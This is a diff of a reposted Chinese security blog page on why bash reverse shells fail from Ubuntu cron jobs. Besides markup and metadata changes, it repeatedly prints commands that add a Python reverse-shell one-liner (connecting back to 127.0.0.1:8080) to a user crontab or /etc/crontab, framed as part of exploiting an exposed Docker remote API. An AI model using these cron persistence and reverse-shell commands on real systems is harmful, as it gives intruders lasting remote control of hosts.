@@ -86,26 +86,19 @@
 
 
 
-<meta name="description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta name="description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog   图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出 所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta name="keywords" content="Linux,Shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux crontab back Shell">
 <meta property="og:url" content="http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html">
 <meta property="og:site_name" content="Smilent">
-<meta property="og:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta property="og:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog   图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出 所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://joychou.org/usr/uploads/2016/05/1700093592.png">
 <meta property="og:updated_time" content="2016-06-03T10:27:19.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux crontab back Shell">
-<meta name="twitter:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta name="twitter:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog   图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出 所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
 <meta name="twitter:image" content="http://joychou.org/usr/uploads/2016/05/1700093592.png">
 
 
@@ -351,11 +344,11 @@
 <h3 id="0x01-1号坑（ubuntu不能使用bash反弹shell）"><a href="#0x01-1号坑（ubuntu不能使用bash反弹shell）" class="headerlink" title="0x01 1号坑（ubuntu不能使用bash反弹shell）"></a>0x01 1号坑（ubuntu不能使用<code>bash</code>反弹shell）</h3><p>可能大家平时比较少人ubuntu，所以不大知道这个特性</p>
 <p>今天让几个朋友测试了，结果是：<br><code>/etc/crontab</code>和<code>/var/spool/cron/crontabs/</code>，<code>bash -i</code>反弹shell都失败</p>
 <p>但是python可以，而且现在centos和ubuntu基本都自带python</p>
-<p>执行以下命令，以当前bash权限用户，创建一个crontab文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(crontab <span class="_">-l</span>;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</div></pre></td></tr></table></figure></p>
+<p>执行以下命令，以当前bash权限用户，创建一个crontab文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p>
 <p><code>crontab -</code>将管道符前面的内容写入到当前用户的crontab文件里</p>
 <p><code>* * * * *</code>表示每一分钟执行该命令，等同于<code>*/1 * * * *</code></p>
 <p>如果是ubuntu的root权限，写到<code>/var/spool/cron/crontabs/root</code>文件<br>如果是centos的root权限，写到<code>/var/spool/cron/root</code></p>
-<p>执行成功后，相应的文件创建或者追加如下内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * *  /usr/bin/python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure></p>
+<p>执行成功后，相应的文件创建或者追加如下内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * *  /usr/bin/python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）"><a href="#0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）" class="headerlink" title="0x02 2号坑（ubuntu用户的定时任务在/var/spool/cron/crontabs/目录下）"></a>0x02 2号坑（ubuntu用户的定时任务在<code>/var/spool/cron/crontabs/</code>目录下）</h3><p>之前，一直误认为所有linux系统用户的定时任务都在<code>/var/spool/cron/</code>目录下</p>
 <p>其实是我自以为，人最怕只以为是……</p>
 <p>现在回想起来，终于可以解释之前写的hackredis.py中，为何有时不能创建<code>/root/.ssh/</code>目录</p>
@@ -367,9 +360,9 @@
 <li>写当前用户下的crontab 或者写<code>/etc/crontab</code>也可以</li>
 <li>使用python反弹shell的脚本</li>
 </ol>
-<p>写当前用户下的crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(crontab <span class="_">-l</span>;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</div></pre></td></tr></table></figure></p>
-<p>写/etc/crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span> &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure></p>
-<p>原文:<a href="http://joychou.org/index.php/web/linux-crontab-rebound-shell-hole.html" target="_blank" rel="external">JoyChou</a></p>
+<p>写当前用户下的crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p>
+<p>写/etc/crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure></p>
+<p>原文:<a href="http://joychou.org/index.php/web/linux-crontab-rebound-shell-hole.html" target="_blank" rel="noopener">JoyChou</a></p>
 
       
     </div>
@@ -590,7 +583,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2016</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
